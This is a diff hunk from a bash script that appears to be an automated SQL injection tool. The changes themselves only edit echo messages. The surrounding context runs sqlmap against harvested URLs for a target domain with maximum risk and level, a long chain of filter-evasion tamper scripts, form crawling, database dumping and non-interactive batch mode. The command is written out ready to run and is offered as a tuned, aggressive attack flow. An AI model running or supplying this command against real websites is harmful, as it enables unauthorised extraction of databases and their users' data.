@@ -66,9 +66,9 @@ num_sql_urls2=$(wc -l "$domain/sql_ready_urls2.txt" | cut -d ' ' -f 1)
 echo -e "Found $num_sql_urls2 URLs \e[91mready\e[0m for SQL injection testing for $domain after using Arjun and Mixing all results..."
 sleep 5  # Pause for 5 seconds
 # Test SQL injection on the new list of URLs using SQLMAP
-echo -e "Testing SQL injection on the new list of URLs using SQLMAP with a Tweaked \e[91mAgressive\e[0m Approach..." | lolcat
+echo -e "Testing SQL injection on the new list of URLs using SQLMAP with a Tweaked \e[91mAgressive\e[0m Approach, Let's go!..." | lolcat
 sqlmap -m "$domain/sql_ready_urls2.txt" --risk=3 --smart --hpp --level=5 --random-agent --threads=10 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --skip-urlencode --string "saintdrugis1337" --forms --dump --dbms=mysql --batch
-echo "Make sure to examine the results manually in the location where it saves all the results: /root/.local/share/sqlmap/output/" | lolcat
+echo "Make sure to examine the results \e[91mmanually\e[0m in the location where it saves all the results: /root/.local/share/sqlmap/output/" | lolcat
 sleep 3
 echo -e "\n\033[1;32mThis tool comes with amazing AI-created photos that were done during coding this. \033[0m"
 echo -e "\033[1;32mA lot of hours were spent on optimizing this massive SQL command and the flow. \033[0m"
